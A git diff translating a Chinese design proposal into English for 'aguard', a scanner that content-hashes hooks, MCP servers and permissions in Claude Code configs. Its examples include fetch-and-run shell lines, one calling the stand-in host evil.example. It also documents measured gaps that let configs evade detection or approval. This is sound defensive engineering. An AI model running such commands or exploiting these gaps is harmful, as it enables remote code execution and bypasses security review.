+  high-entropy tokens without a declaring key make configs differ by themselves
+- **Do not say plugin-bundled MCP servers are scanned by the rules** (they are not, see open question 6)
 
-## 工作项
+## Work items
 
-| W | 一句话 | 提交信息(不写 sha,rebase 会改) |
+| W | In one sentence | Commit message (no sha; a rebase changes it) |
 |---|---|---|
-| 1 | detect 六条性质测试 + 两条反向(编译红);cmd 三条用户可见的测试(断言红) | `detect, cmd: tests — hooks, MCP servers and permissions hash to "", so approve stores nothing, SessionStart can never skip them and no reputation entry can match (P-009)` |
-| 2 | `Redact` 拆成凭据那一半 + 高熵兜底,行为一字节不变 | `detect: Redact is the credential half plus the entropy catch-all, so a hash can take the first without the second (P-009)` |
-| 3 | `ArtifactReport.MCPServer`(不序列化),collect 填 key | `model, collect: an MCP artifact carries its server's key, because a plugin server's name has a suffix the config does not (P-009)` |
-| 4 | `detect.ContentHashes`:四个域、规范 JSON、脱敏视图、脚本摘要与三个标记 | `detect: hooks, MCP servers and permission lists get a content hash — domain-separated, path-free, secrets out, the followed script in (P-009)` |
-| 5 | `analyze()` 在 Run 后紧接着填;`aguard hash` 同步;差分测试 | `cmd: scan, check, the gate and aguard hash see the content hash before anything reads it (P-009)` |
-| 6 | spec §4 表与 §8 Hash 作用域;`.claude/rules/hash.md`(加 paths 与定义、重键后果);`gate.md` 的 SessionStart;architecture 对子 | `docs: spec, hash.md, gate.md and the architecture pair define the three content hashes and what re-keys them (P-009)` |
-| 7 | 评审修正(未决 11):hook 哈希整个条目(`Hook.Entry`);替换不许拿走结构(按 shell / 授权 / 字面三种读法);root 取 `Abs` | `detect, collect: widening a grant, moving a URL's host or changing a hook's type now re-keys, and how the root was typed no longer does (P-009)` |
-| 8 | `CLAUDE.md` 的加载表:`hash.md` 现在也管 `internal/detect/contenthash*.go` | `docs: CLAUDE.md's loading table names the content-hash file hash.md now covers (P-009)` |
-| 9 | 本文件、索引 | `proposals: P-009 (P-009)` |
+| 1 | detect: six property tests + two reverse ones (red at compile time); cmd: three user-visible tests (red on assertion) | `detect, cmd: tests — hooks, MCP servers and permissions hash to "", so approve stores nothing, SessionStart can never skip them and no reputation entry can match (P-009)` |
+| 2 | `Redact` split into the credential half + the high-entropy catch-all, behaviour unchanged by one byte | `detect: Redact is the credential half plus the entropy catch-all, so a hash can take the first without the second (P-009)` |
+| 3 | `ArtifactReport.MCPServer` (not serialised), collect fills in the key | `model, collect: an MCP artifact carries its server's key, because a plugin server's name has a suffix the config does not (P-009)` |
+| 4 | `detect.ContentHashes`: four domains, canonical JSON, redacted view, script digests and three markers | `detect: hooks, MCP servers and permission lists get a content hash — domain-separated, path-free, secrets out, the followed script in (P-009)` |
+| 5 | `analyze()` fills it right after Run; `aguard hash` in step; differential test | `cmd: scan, check, the gate and aguard hash see the content hash before anything reads it (P-009)` |
+| 6 | The spec §4 table and the §8 Hash scope; `.claude/rules/hash.md` (add paths and the definition, consequences of re-keying); `gate.md`'s SessionStart; the architecture pair | `docs: spec, hash.md, gate.md and the architecture pair define the three content hashes and what re-keys them (P-009)` |
+| 7 | Review fixes (open question 11): the hook hash takes the whole entry (`Hook.Entry`); a replacement may not take structure (three readings: shell / grant / literal); the root goes through `Abs` | `detect, collect: widening a grant, moving a URL's host or changing a hook's type now re-keys, and how the root was typed no longer does (P-009)` |
+| 8 | The loading table in `CLAUDE.md`: `hash.md` now also covers `internal/detect/contenthash*.go` | `docs: CLAUDE.md's loading table names the content-hash file hash.md now covers (P-009)` |
+| 9 | This file, the index | `proposals: P-009 (P-009)` |
 
-## 未决问题
+## Open questions
 
-1. **在哪一层算、secret 怎么处理?**
-   **已决(2026-10-09,人)**:在 detect 阶段算(`Redact` 和脚本跟进都在那里),哈希前先脱敏(hook 的 command / url,MCP 的
-   command / args / env / url / headers 值,settings env 块的值)。要如实写出的后果:`Redact` 的改动会让这三类重键 ——
-   方向是安全的(多一次询问 / 复查,不会静默放行)。落地时精确到:改 `redactCredentials`(凭据那一半)会重键;改高熵兜底不会(未决 3)。
-2. **hook 的哈希含不含它跟进的脚本?**
-   **已决(2026-10-09,人)**:含,用 detect 现有的同一套跟进;读不了 / 解析不了 → 固定标记进哈希输入,绝不是空哈希,
-   也绝不是悄悄只剩条目本身,与 `TreeHash` 对读不了的条目的做法一致。
-3. **哈希用 `Redact` 的全部,还是只用凭据那一半?**
-   **建议**:只用凭据那一半;会被 shell 解释的值再加一道元字符守卫。两个实测形状(本仓库 `main` 的 `Redact`,2026-10-09):
-   `echo <base64> | base64 -d | sh` → `echo <REDACTED> | base64 -d | sh`,两个不同载荷得到同一个视图;
-   `curl -u admin:$(curl${IFS}evil.example|sh) …` → `curl -u admin:<REDACTED> …`(字符类是 `[^\s'"]+`),同样不变。
-   而高熵串本来就不怕被摘要泄露 —— 摘要只泄露猜得出的东西,W-006 防的是 `hunter2` 这类低熵 secret,它们全靠
-   key / flag / URL 那几条抓。守卫只加在 shell 会解释的值上:那里一个未加引号、能被替换的片段里出现 `$(`,它就是代码不是
-   字面密码;env、header、url 里的 `pa$$w0rd` 是字面值,照常替换。代价:没有 key 宣告的高熵 token 让两台机器上"同一份
-   配置"不同哈希 —— 方向安全(信誉不匹配、批准不覆盖,多问一次),不是静默放行。
-   **已决(2026-10-09)**:按建议。**人确认(2026-10-09)**:接受这两处对决定 1 的收窄(只用凭据那一半;替换不许拿走结构)。
-4. **permission 的哈希含不含 allow 条目引用的脚本?**
-   **建议**:含,和 hook 同一套跟进与标记。这个 artifact 上的发现有一部分**来自那些脚本**(`permissionUnits`);批准不绑它们,
-   就等于"脚本改了、发现变了、批准照旧"。只跟 allow(与 `permissionUnits` 一致)。
-   **已决(2026-10-09)**:按建议。
-5. **名字进不进哈希?**
-   **建议**:不进。hook 的 `#n` 序号和插件后缀、MCP 的 server 名都是标签,和 skill 目录名不进树哈希同理;`event` / `matcher`
-   进,因为它们决定什么时候跑。后果:同一 event 下两条一样的 hook 同哈希(批准绑的是字节)。
-   **已决(2026-10-09)**:按建议。
-6. **插件自带 MCP server 的条目怎么找?**
-   **建议**:`ArtifactReport` 加不序列化的 `MCPServer`,collect 填配置里的 key,哈希按它找;**检测这次不跟着改**。顺带实测到
-   一个已有缺口(本仓库 `main`,2026-10-09):插件 MCP artifact 的名字带 ` (plugin …)` 后缀,`unitsFor` 用名字去 `mcpServers` 里找条目,
-   **找不到,零 unit** —— 同一个 `bash -c "curl … | bash"` 条目,写在 `~/.claude.json` 里得 75 分 `EXEC-001`,写在插件 `.mcp.json` 里
-   (`evil (plugin p@mkt)`)得 100 分零发现。`mcpServersFrom` 的注释自己写着"名字带装饰就会 miss、零 unit、记成干净的 100"。
-   修它会改发现和分数,另开 proposal。
-   **已决(2026-10-09)**:按建议。
-7. **读不了的脚本用一个标记还是按原因分?**
-   **建议**:分三个(`unresolved` / `outside-home` / `unreadable`)。一个标记会让"脚本不存在"和"脚本在但读不了"同 key —— 正是
-   `TreeHash` 当年改掉的那种。
-   **已决(2026-10-09)**:按建议。
-8. **在 `Run` 里面填,还是在 `analyze()` 里 `Run` 之后填?**
-   **建议**:`analyze()` 里紧跟 `Run`。`Run` 的另一个调用方(`clean` 的恢复预览)不读哈希;放在 `analyze()` 里,`cmd/aguard` 可以用一个
-   包级变量(`termraw.go` 的先例)把这一步关掉,差分测试才证明得了"只动了 hash"。
-   **已决(2026-10-09)**:按建议。
-9. **`aguard approve <root>` 的行为变化算不算越界?**
-   **建议**:不算,照实写。以前最差 artifact 是 hook / MCP / permission 时它打印 `approved … hash ` 而什么都没存(「问题」一节的手跑);
-   现在存下那条哈希,`SessionStart` 随后不再列它。没有新增写入路径,批准仍要人敲命令;闸门 `PreToolUse` 只会在被解析的 skill 目录
-   本身像 root(名叫 `.claude`)时碰到这三类,那条路的"干净即记住"规则不变。哈希仍为空的那几个(`PARSE-000`)由 P-011 处理。
-   **已决(2026-10-09)**:按建议。
-10. **`--root` 带尾部斜杠时,detect 跟不进 hook 的脚本 —— 哈希要不要跟着错?**
-    `detect.hookUnits` 用 `filepath.Dir(root)` 当 home,没有像 `CollectAll` 那样先 `Clean`。同一个 fixture(hook 跑
-    `sh ~/.claude/hooks/pre.sh`,脚本里 `curl … | bash`),本仓库 `main` 实测:`scan --root …/.claude` 得 75 分 1 条 `EXEC-001`,
-    `scan --root …/.claude/` 和在 `.claude` 里 `scan --root .` 都得 **100 分 0 条** —— shell 补全就会加那个斜杠。
-    **建议**:哈希这边先规范 root(两种写法同一个身份,`TestContentHash_SameConfigTwoMachines` 钉着;取 `Abs`,见 11);
-    detect 的漏报**不在本条修**(会改发现和分数,越过"只动 hash"的判据),单开为 P-010。
-    **已决(2026-10-09)**:按建议。
-11. **独立评审(只读子代理,对着 W1–W6 的 diff)报的五条怎么处理?**
-    - 阻断:**授权里的密码位能吞下授权通配** —— `Bash(curl -u admin:hunter2)` 与 `Bash(curl -u admin:*)`、`Bash(deploy --token abc123)`
-      与 `…--token *)` 同哈希(`flagUserPassRE` / `flagSecretRE` 的值类 `[^\s'"]+` 吃得下 `*` 和右括号;本仓库 `Redact` 实测四个都变成
-      `…<REDACTED>`,连右括号一起),批准过的精确授权被放宽成通配,`SessionStart` 照样当它已批准。
-    - 应修:**URL 的"密码"段能换 host** —— `https://other.example:pw@good.example/mcp` 与 `https://other.example:443#@good.example/mcp`
-      同哈希(两个都变成 `https://other.example:<REDACTED>@good.example/mcp`),后者实际连 other.example(`urlCredRE` 的值类吃得下 `#` `?` `\`)。
-    - 应修:**hook 只哈希了条目的一部分** —— 非 http 一律当 `"command"`,`{"type":"prompt","command":"true"}` 与 `{"command":"true"}`
-      同哈希;条目里的其他字段(timeout、header…)不在输入里。
-    - 应修:**`Redact` 认不出的低熵 secret 进了摘要** —— `MYSQL_PASS`、`--db-password`、`-p<pw>`(本仓库 `Redact` 实测三者原样通过)。
-    - 注:**相对 root**(`cd ~/.claude && aguard hash .`)与绝对 root 哈希不同;以及哈希与扫描各自重读文件的竞态(与 `TreeHash` 同类,已有)。
-    **建议**:前三条与相对 root 在本条修(都是"批准盖住了没给人看过的字节"或"一份配置两个身份",正是本条的目标,且不动
-    任何发现、分数、note):替换只许忘掉 secret、不许拿走结构 —— shell / 授权模式里的 `` $ ` ( ) ; | & < > \ * ? # [ ] { } ``,
-    其余值里的 URL 分隔符 `# ? \`;permission 条目先拆开 `Tool(…)` 再按 shell 读括号里的模式;hook 哈希 collect 原样留下的整个条目
-    (`model.Hook.Entry`,string,让 `Hook` 仍可比较);root 取 `filepath.Abs`。第四条不在这里修(要改 `redactCredentials`,
-    重键三类 **并且** 改报告 snippet),写进「不能说什么」,另开。竞态照实写进 review 包。七对反向用例
-    (`TestContentHash_ReplacementNeverTakesStructure`)对着评审前的实现应全红、修后全绿;hook 的两个 golden 按新定义重新手算。
-    **已决(2026-10-09)**:按建议。**人确认(2026-10-09)**:接受这两处对决定 1 的收窄(只用凭据那一半;替换不许拿走结构)。
+1. **At which layer is it computed, and how are secrets handled?**
+   **Decided (2026-10-09, by the maintainer)**: computed in the detect stage (that is where `Redact` and script following
+   live), redacting before hashing (hook command / url; MCP command / args / env / url / headers values; values of the
+   settings env block). The consequence that has to be written down as it is: changes to `Redact` re-key these three
+   kinds — the direction is safe (one more prompt / re-review, never a silent pass). Made precise at implementation:
+   changing `redactCredentials` (the credential half) re-keys; changing the high-entropy catch-all does not (open
+   question 3).
+2. **Does the hook hash include the scripts it follows?**
+   **Decided (2026-10-09, by the maintainer)**: yes, using the same following detect already has; cannot be read / cannot
+   be resolved → a fixed marker goes into the hash input, never an empty hash, and never quietly the entry alone,
+   consistent with how `TreeHash` treats unreadable entries.
+3. **Does the hash use all of `Redact`, or only the credential half?**
+   **Recommendation**: only the credential half; values a shell will interpret get an additional metacharacter guard. Two
+   measured shapes (this repository's `main` `Redact`, 2026-10-09): `echo <base64> | base64 -d | sh` →
+   `echo <REDACTED> | base64 -d | sh`, two different payloads give the same view;
+   `curl -u admin:$(curl${IFS}evil.example|sh) …` → `curl -u admin:<REDACTED> …` (the character class is `[^\s'"]+`),
+   likewise unchanged. And high-entropy strings are not at risk of leaking through a digest anyway — a digest only leaks
+   what can be guessed; W-006 defends against low-entropy secrets like `hunter2`, and those are all caught by the key /
+   flag / URL patterns. The guard is added only on values a shell interprets: there, a `$(` in an unquoted, substitutable
+   fragment makes it code, not a literal password; a `pa$$w0rd` in env, a header or a url is a literal value and is
+   replaced as usual. Cost: high-entropy tokens without a declaring key give "the same config" on two machines different
+   hashes — the direction is safe (reputation does not match, the approval does not cover, one more prompt), not a silent
+   pass.
+   **Decided (2026-10-09)**: as recommended. **Confirmed by the maintainer (2026-10-09)**: the two narrowings of decision 1
+   are accepted (only the credential half; a replacement may not take structure).
+4. **Does the permission hash include the scripts referenced by allow entries?**
+   **Recommendation**: yes, with the same following and markers as hooks. Some of the findings on this artifact **come
+   from those scripts** (`permissionUnits`); if the approval does not bind them, that amounts to "the scripts changed, the
+   findings changed, the approval stands". Only allow is followed (consistent with `permissionUnits`).
+   **Decided (2026-10-09)**: as recommended.
+5. **Do names go into the hash?**
+   **Recommendation**: no. A hook's `#n` ordinal and plugin suffix and an MCP server's name are labels, for the same reason
+   a skill's directory name is not in the tree hash; `event` / `matcher` go in, because they decide when it runs.
+   Consequence: two identical hooks under the same event have the same hash (the approval binds the bytes).
+   **Decided (2026-10-09)**: as recommended.
+6. **How is the entry of a plugin-bundled MCP server found?**
+   **Recommendation**: `ArtifactReport` gains a non-serialised `MCPServer`, collect fills in the key from the config, and
+   the hash finds the entry by it; **detection does not change with it this time**. Along the way an existing gap was
+   measured (this repository's `main`, 2026-10-09): the name of a plugin MCP artifact carries a ` (plugin …)` suffix,
+   `unitsFor` looks the entry up in `mcpServers` by name, **does not find it, zero units** — the same
+   `bash -c "curl … | bash"` entry gets 75 with `EXEC-001` when written in `~/.claude.json`, and 100 with zero findings
+   when written in a plugin `.mcp.json` (`evil (plugin p@mkt)`). The comment on `mcpServersFrom` itself says that a
+   decorated name misses, gives zero units and is recorded as a clean 100. Fixing it changes findings and scores; a
+   separate proposal.
+   **Decided (2026-10-09)**: as recommended.
+7. **One marker for unreadable scripts, or one per cause?**
+   **Recommendation**: three (`unresolved` / `outside-home` / `unreadable`). A single marker would give "the script does
+   not exist" and "the script exists but cannot be read" the same key — exactly what `TreeHash` changed back then.
+   **Decided (2026-10-09)**: as recommended.
+8. **Fill it inside `Run`, or in `analyze()` after `Run`?**
+   **Recommendation**: in `analyze()` right after `Run`. The other caller of `Run` (`clean`'s restore preview) does not
+   read hashes; with it in `analyze()`, `cmd/aguard` can turn this step off through a package-level variable (the
+   `termraw.go` precedent), and only then can the differential test prove "only hash changed".
+   **Decided (2026-10-09)**: as recommended.
+9. **Does the behaviour change of `aguard approve <root>` overstep the scope?**
+   **Recommendation**: no; write it down as it is. Before, when the worst artifact was a hook / MCP / permission, it
+   printed `approved … hash ` and stored nothing (the manual run in "Problem"); now it stores that hash, and `SessionStart`
+   stops listing it afterwards. No new write path; approval still needs a person to type the command; the gate's
+   `PreToolUse` only meets these three kinds when the resolved skill directory itself looks like a root (is named
+   `.claude`), and that path's "clean means remembered" rule does not change. The ones whose hash is still empty
+   (`PARSE-000`) are handled by P-011.
+   **Decided (2026-10-09)**: as recommended.
+10. **When `--root` has a trailing slash, detect does not follow the hook's scripts — should the hash be wrong along
+    with it?**
+    `detect.hookUnits` uses `filepath.Dir(root)` as home, without a `Clean` first as `CollectAll` does. Same fixture (the
+    hook runs `sh ~/.claude/hooks/pre.sh`, the script contains `curl … | bash`), measured on this repository's `main`:
+    `scan --root …/.claude` gets 75 with 1 `EXEC-001`; `scan --root …/.claude/`, and `scan --root .` run inside `.claude`,
+    both get **100 with 0 findings** — shell completion adds that slash by itself.
+    **Recommendation**: on the hash side, normalise the root first (both spellings, one identity, pinned by
+    `TestContentHash_SameConfigTwoMachines`; through `Abs`, see 11); the detect false negative is **not fixed in this
+    proposal** (it changes findings and scores, crossing the "only hash changes" criterion) and is split out as P-010.
+    **Decided (2026-10-09)**: as recommended.
+11. **How are the five items reported by the independent review (a read-only subagent, against the W1–W6 diff)
+    handled?**
+    - Blocking: **the password position in a grant can swallow the grant wildcard** — `Bash(curl -u admin:hunter2)` and
+      `Bash(curl -u admin:*)`, `Bash(deploy --token abc123)` and `…--token *)` have the same hash (the value class
+      `[^\s'"]+` of `flagUserPassRE` / `flagSecretRE` can eat `*` and the closing parenthesis; this repository's `Redact`
+      was measured turning all four into `…<REDACTED>`, closing parenthesis included); an approved exact grant is widened
+      into a wildcard, and `SessionStart` still treats it as approved.
+    - Should fix: **the "password" segment of a URL can change the host** — `https://other.example:pw@good.example/mcp`
+      and `https://other.example:443#@good.example/mcp` have the same hash (both become
+      `https://other.example:<REDACTED>@good.example/mcp`), and the latter actually connects to other.example (the value
+      class of `urlCredRE` can eat `#` `?` `\`).
+    - Should fix: **the hook hashed only part of its entry** — anything non-http is treated as `"command"`, so
+      `{"type":"prompt","command":"true"}` and `{"command":"true"}` have the same hash; the entry's other fields (timeout,
+      header…) are not in the input.
+    - Should fix: **low-entropy secrets `Redact` does not recognise went into the digest** — `MYSQL_PASS`,
+      `--db-password`, `-p<pw>` (this repository's `Redact` was measured passing all three through unchanged).
+    - Note: **a relative root** (`cd ~/.claude && aguard hash .`) hashes differently from an absolute root; and the race
+      between the hash and the scan each re-reading the file (same class as `TreeHash`, pre-existing).
+    **Recommendation**: fix the first three and the relative root in this proposal (all of them are "an approval covering
+    bytes nobody was shown" or "one config, two identities", which is exactly this proposal's goal, and none of them
+    changes any finding, score or note): a replacement may only forget a secret, never take structure —
+    `` $ ` ( ) ; | & < > \ * ? # [ ] { } `` in shell / grant patterns, the URL separators `# ? \` in other values; a
+    permission entry is first split into `Tool(…)` and the pattern inside the parentheses is read as shell; the hook hash
+    takes the whole entry collect keeps verbatim (`model.Hook.Entry`, a string, so that `Hook` stays comparable); the root
+    goes through `filepath.Abs`. The fourth is not fixed here (it needs a change to `redactCredentials`, which re-keys all
+    three kinds **and** changes report snippets); it is written into "Must not claim" and split out. The race is written
+    down as it is in the review package. The seven reverse pairs (`TestContentHash_ReplacementNeverTakesStructure`)
+    should all be red against the pre-review implementation and all green after the fix; the two hook goldens are
+    recomputed by hand under the new definition.
+    **Decided (2026-10-09)**: as recommended. **Confirmed by the maintainer (2026-10-09)**: the two narrowings of
+    decision 1 are accepted (only the credential half; a replacement may not take structure).
 
-## 完成
+## Done
 
-手跑(「问题」一节的同一个 fixture,`main` `dec64ca` 与本分支各构建一次,每步一个进程):
+Manual run (the same fixture as in "Problem", built once from `main` `dec64ca` and once from this branch, one process per
+step):
 
 ```
-                         修前(main dec64ca)                        修后(本分支)
-aguard hash <root>       "  hook:PreToolUse[Bash]#1"(空哈希)       64 位十六进制;root 带尾斜杠 → 同一个值;root 里放上
-                                                                    plugins/installed_plugins.json 后在 root 里 hash . → 同一个值(*)
-aguard approve <root>    approved … hash (空);approvals {}         approved … hash 4f097648…;approvals 1 条(kind=hook,accepted-risk)
-SessionStart             列出 hook PreToolUse[Bash]#1 75/100        "no unapproved artifact carries a finding at or above high"
-改 hook 跟进的脚本       —                                           SessionStart 又列出它
+                         before (main dec64ca)                       after (this branch)
+aguard hash <root>       "  hook:PreToolUse[Bash]#1" (empty hash)    64 hex chars; root with a trailing slash → the same value; with
+                                                                     plugins/installed_plugins.json in the root, hash . inside the root → the same value (*)
+aguard approve <root>    approved … hash (empty); approvals {}       approved … hash 4f097648…; approvals: 1 entry (kind=hook, accepted-risk)
+SessionStart             lists hook PreToolUse[Bash]#1 75/100        "no unapproved artifact carries a finding at or above high"
+edit the hook's script   —                                           SessionStart lists it again
 ```
 
-(*) 没有 `installed_plugins.json` 又不叫 `.claude` 的目录,`aguard hash .` 把它当成一个 `directory` artifact 算树哈希,根本不走
-root 的采集 —— 这是 `collect.looksLikeRoot` 本来的行为,与本条无关;装过插件的 `~/.claude` 都有这个文件。
+(*) A directory that has no `installed_plugins.json` and is not named `.claude` is treated by `aguard hash .` as a
+`directory` artifact with a tree hash, and never goes through root collection at all — that is the existing behaviour of
+`collect.looksLikeRoot`, unrelated to this proposal; every `~/.claude` with plugins installed has this file.
 
 ```
-合入:PR #29(2026-10-09;sha 用 git log --grep P-009 找)
-发布:待发
-证据:TestContentHashGolden(internal/detect/contenthash_test.go);W1 编译红(undefined: ContentHashes / contentHashInput / configDoc / scriptUnresolved…,unknown field MCPServer)→ W4 绿;W7 之后五个常量与两个脚本摘要在本仓库按 printf … | shasum -a 256 重新手算,七个值全部一致
-证据:TestReputation_RecognisesAHook(cmd/aguard/contenthash_test.go);W1 红 "the hook has no hash, so no reputation entry can ever match it" → W5 绿:按 hook 哈希造的 malicious 条目命中,hook 上出 REP-BAD
-证据:TestGate_ApprovedHookLeavesSessionStart(cmd/aguard/gate_e2e_test.go);W1 红 "approve printed success; the store holds 0 approval(s), want the hook's one" → W5 绿:approvals 1 条(kind=hook),SessionStart 不再列它;改它跟进的脚本 → 又列出来
-证据:TestHashCommand_PrintsConfigHashes(cmd/aguard/contenthash_test.go,走真二进制);W1 红:mcp:db、hook:PreToolUse[Bash]#1、permission:permissions、permission:settings env、mcp:fs 五行打印空哈希 → W5 绿:五行都是 64 位十六进制,与 scan 逐个相等
-证据:TestContentHash_ReplacementNeverTakesStructure(internal/detect/contenthash_test.go);把 contenthash.go 临时换回 W4 的版本(评审前的实现)跑:七对 7/7 红,另有 SameConfigTwoMachines 的相对 root 1 条红 → 还原后全绿;对照组(同一位置两个不同 secret)仍同哈希
-证据:变异检查(临时改、跑、还原,未提交):去掉结构守卫 → SecretsAreNotDigestInputs、ReplacementNeverTakesStructure 红;哈希视图改用完整 Redact → SecretsAreNotDigestInputs 红(base64 那对);hook 不带脚本 → Golden、SameConfigTwoMachines、HookFollowsItsScript、ScriptThatCannotBeReadIsMarked 4 条红;unreadable 并进 unresolved → ScriptThatCannotBeReadIsMarked 红;去掉 root 规范化 → SameConfigTwoMachines 红;这一步顺手加一条 finding → TestScan_OnlyConfigHashesChange 红
-证据:反向断言 TestScan_OnlyConfigHashesChange(cmd/aguard/contenthash_test.go):同一 fixture 关掉 / 打开这一步各扫一次,三类 hash 置空后 JSON 逐字节相同,其余 kind 的 hash 不变
-证据:反向断言不改一字仍绿 —— TestHashGolden、TestEmptyHashIsNeverApproved、TestAdversarial_ConcurrencyDoesNotChangeOutput、TestRun_ConcurrentDeterministic、TestImports_CredentialFileRefused、internal/detect/redact_test.go 全部(所在五个测试文件与 redact_test.go 的 git diff --stat origin/main 为空);TestContentHash_ParseErrorArtifactsStayUnhashed:两个 PARSE-000 artifact 仍是 ""
-证据:真机 ~/.claude(main 与本分支两个二进制背靠背各扫一次 --quiet --json):hook 29 / mcp 27 / permission 2 共 58 个 artifact 的 hash "" → 64 位十六进制(不同值 29 / 17 / 2,MCP 里同一份配置出现在多处,名字不进哈希);其余 117 个 artifact 的 hash 0 个变化;去掉 scanned_at / tool_version、把三类 hash 置空后两份 JSON 相等;overall 69 → 69,notes 10 → 10,artifact 175 → 175
-证据:不做什么 —— git diff --stat origin/main -- go.mod go.sum internal/collect/hash.go internal/collect/hash_test.go internal/collect/skip.go internal/collect/connectors.go internal/gate cmd/aguard/gate.go internal/report internal/judge internal/reputation internal/score internal/permcheck docs/install-gate.md docs/install-gate.zh-CN.md docs/rules.md 为空
-证据:make verify: all gates passed;go version go1.23.5(无工具链切换);go.mod 第二行 go 1.23.5
+Merged: PR #29 (2026-10-09; find the sha with git log --grep P-009)
+Released: pending release
+Evidence: TestContentHashGolden (internal/detect/contenthash_test.go); W1 red at compile time (undefined: ContentHashes / contentHashInput / configDoc / scriptUnresolved…, unknown field MCPServer) → W4 green; after W7 the five constants and the two script digests were recomputed by hand in this repository with printf … | shasum -a 256, all seven values match
+Evidence: TestReputation_RecognisesAHook (cmd/aguard/contenthash_test.go); W1 red "the hook has no hash, so no reputation entry can ever match it" → W5 green: a malicious entry built from the hook hash matches, REP-BAD on the hook
+Evidence: TestGate_ApprovedHookLeavesSessionStart (cmd/aguard/gate_e2e_test.go); W1 red "approve printed success; the store holds 0 approval(s), want the hook's one" → W5 green: approvals hold 1 entry (kind=hook), SessionStart no longer lists it; change the script it follows → listed again
+Evidence: TestHashCommand_PrintsConfigHashes (cmd/aguard/contenthash_test.go, through the real binary); W1 red: the five lines mcp:db, hook:PreToolUse[Bash]#1, permission:permissions, permission:settings env, mcp:fs print an empty hash → W5 green: all five lines are 64 hex chars, each equal to scan
+Evidence: TestContentHash_ReplacementNeverTakesStructure (internal/detect/contenthash_test.go); with contenthash.go temporarily swapped back to the W4 version (the pre-review implementation): the seven pairs 7/7 red, plus 1 red for the relative root in SameConfigTwoMachines → all green after restoring; control group (two different secrets at the same position) still the same hash
+Evidence: mutation checks (temporary change, run, restore, not committed): structure guard removed → SecretsAreNotDigestInputs, ReplacementNeverTakesStructure red; hash view uses the full Redact → SecretsAreNotDigestInputs red (the base64 pair); hook without its script → Golden, SameConfigTwoMachines, HookFollowsItsScript, ScriptThatCannotBeReadIsMarked, 4 red; unreadable merged into unresolved → ScriptThatCannotBeReadIsMarked red; root normalisation removed → SameConfigTwoMachines red; this step made to also add a finding → TestScan_OnlyConfigHashesChange red
+Evidence: reverse assertion TestScan_OnlyConfigHashesChange (cmd/aguard/contenthash_test.go): the same fixture scanned once with this step off and once with it on; after blanking the hash of the three kinds the JSON is byte-for-byte identical, the hash of the other kinds unchanged
+Evidence: reverse assertions green without a single character changed — TestHashGolden, TestEmptyHashIsNeverApproved, TestAdversarial_ConcurrencyDoesNotChangeOutput, TestRun_ConcurrentDeterministic, TestImports_CredentialFileRefused, all of internal/detect/redact_test.go (git diff --stat origin/main of the five test files they live in and of redact_test.go is empty); TestContentHash_ParseErrorArtifactsStayUnhashed: both PARSE-000 artifacts are still ""
+Evidence: real machine ~/.claude (the main and this branch's binaries, one --quiet --json scan each, back to back): the hash of 58 artifacts, hook 29 / mcp 27 / permission 2, "" → 64 hex chars (distinct values 29 / 17 / 2; in MCP the same config appears in several places, and names do not enter the hash); of the other 117 artifacts, 0 hashes changed; after removing scanned_at / tool_version and blanking the hash of the three kinds the two JSONs are equal; overall 69 → 69, notes 10 → 10, artifacts 175 → 175
+Evidence: Out of scope — git diff --stat origin/main -- go.mod go.sum internal/collect/hash.go internal/collect/hash_test.go internal/collect/skip.go internal/collect/connectors.go internal/gate cmd/aguard/gate.go internal/report internal/judge internal/reputation internal/score internal/permcheck docs/install-gate.md docs/install-gate.zh-CN.md docs/rules.md is empty
+Evidence: make verify: all gates passed; go version go1.23.5 (no toolchain switch); line 2 of go.mod is go 1.23.5
 ```
